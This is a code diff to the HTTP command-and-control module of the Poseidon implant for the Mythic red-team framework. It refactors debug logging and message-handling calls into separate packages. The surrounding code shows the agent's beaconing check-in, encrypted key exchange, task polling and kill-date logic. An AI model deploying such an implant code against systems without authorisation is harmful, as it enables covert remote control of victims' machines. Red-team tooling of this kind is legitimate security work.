@@ -9,6 +9,8 @@ import (
 	"crypto/rsa"
 	"crypto/tls"
 	"encoding/base64"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"io"
 	"os"
 
@@ -140,7 +142,7 @@ func init() {
 	// Add HTTP Headers
 	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
 	if err := json.Unmarshal([]byte(http_headers), &profile.HeaderList); err != nil {
-		PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
+		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
 	}
 
 	// Add proxy info if set
@@ -159,7 +161,7 @@ func init() {
 	if http_encrypted_exchange_check == "true" {
 		profile.ExchangingKeys = true
 	}
-	AddAvailableProfile(&profile)
+	RegisterAvailableC2Profile(&profile)
 }
 
 func (c *C2HTTP) Start() {
@@ -175,7 +177,7 @@ func (c *C2HTTP) Start() {
 	for {
 
 		if c.ShouldStop {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
 			return
 		}
 		checkIn := c.CheckIn()
@@ -183,11 +185,11 @@ func (c *C2HTTP) Start() {
 		if strings.Contains(checkIn.Status, "success") {
 			for {
 				if c.ShouldStop {
-					PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
+					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
 					return
 				}
 				// loop through all task responses
-				message := CreateMythicPollMessage()
+				message := responses.CreateMythicPollMessage()
 				if encResponse, err := json.Marshal(message); err == nil {
 					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
 					resp := c.SendMessage(encResponse)
@@ -195,14 +197,14 @@ func (c *C2HTTP) Start() {
 						//fmt.Printf("Raw resp: \n %s\n", string(resp))
 						taskResp := structs.MythicMessageResponse{}
 						if err := json.Unmarshal(resp, &taskResp); err != nil {
-							PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
+							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
 							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 							continue
 						}
-						HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 					}
 				} else {
-					PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
+					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
 				}
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			}
@@ -217,9 +219,9 @@ func (c *C2HTTP) Stop() {
 		return
 	}
 	c.ShouldStop = true
-	PrintDebug("issued stop to http\n")
+	utils.PrintDebug("issued stop to http\n")
 	<-c.stoppedChannel
-	PrintDebug("http fully stopped\n")
+	utils.PrintDebug("http fully stopped\n")
 }
 func (c *C2HTTP) UpdateConfig(parameter string, value string) {
 	switch parameter {
@@ -253,7 +255,7 @@ func (c *C2HTTP) UpdateConfig(parameter string, value string) {
 		}
 	case "Headers":
 		if err := json.Unmarshal([]byte(http_headers), &c.HeaderList); err != nil {
-			PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
+			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
 		}
 	}
 }
@@ -313,14 +315,14 @@ func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 			// loop until we successfully negotiate a key
 			//fmt.Printf("trying to negotiate key\n")
 			if c.ShouldStop {
-				PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
+				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
 				return structs.CheckInMessageResponse{}
 			}
 		}
 	}
 	for {
 		if c.ShouldStop {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
 			return structs.CheckInMessageResponse{}
 		}
 		checkin := CreateCheckinMessage()
@@ -333,7 +335,7 @@ func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 			// save the Mythic id
 			response := structs.CheckInMessageResponse{}
 			if err = json.Unmarshal(resp, &response); err != nil {
-				PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
+				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
 				time.Sleep(time.Duration(c.GetSleepTime()))
 				continue
 			}
@@ -352,7 +354,7 @@ func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 
 // NegotiateKey - EKE key negotiation
 func (c *C2HTTP) NegotiateKey() bool {
-	sessionID := GenerateSessionID()
+	sessionID := utils.GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	// Replace struct with dynamic json
@@ -372,12 +374,12 @@ func (c *C2HTTP) NegotiateKey() bool {
 	// Decrypt & Unmarshal the response
 	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 	if c.ShouldStop {
-		PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
+		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
 		return false
 	}
 	err = json.Unmarshal(resp, &sessionKeyResp)
 	if err != nil {
-		PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
+		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
 		return false
 	}
 
@@ -448,7 +450,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 	// bail out of trying to send data after 5 failed attempts
 	for i := 0; i < 5; i++ {
 		if c.ShouldStop {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
 			return []byte{}
 		}
 		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
@@ -456,7 +458,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 		if today.After(c.Killdate) {
 			os.Exit(1)
 		} else if req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64)); err != nil {
-			PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
 			continue
 		} else {
 			req.ContentLength = int64(contentLength)
@@ -478,29 +480,29 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 				req.Header.Add("Proxy-Authorization", basicAuth)
 			}
 			if resp, err := client.Do(req); err != nil {
-				PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
+				utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
 				IncrementFailedConnection(c.ProfileName())
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 				continue
 			} else if resp.StatusCode != 200 {
-				PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
+				utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
 				IncrementFailedConnection(c.ProfileName())
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 				continue
 			} else {
 				defer resp.Body.Close()
 				if body, err := io.ReadAll(resp.Body); err != nil {
-					PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
+					utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
 					IncrementFailedConnection(c.ProfileName())
 					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 					continue
 				} else if raw, err := base64.StdEncoding.DecodeString(string(body)); err != nil {
-					PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
+					utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
 					IncrementFailedConnection(c.ProfileName())
 					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 					continue
 				} else if len(raw) < 36 {
-					PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
+					utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
 					IncrementFailedConnection(c.ProfileName())
 					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 					continue
@@ -509,7 +511,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 					enc_raw := c.decryptMessage(raw[36:])
 					if len(enc_raw) == 0 {
 						// failed somehow in decryption
-						PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
+						utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
 						IncrementFailedConnection(c.ProfileName())
 						time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 						continue
@@ -524,7 +526,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 			}
 		}
 	}
-	PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
+	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
 	return make([]byte, 0) //shouldn't get here
 }
 
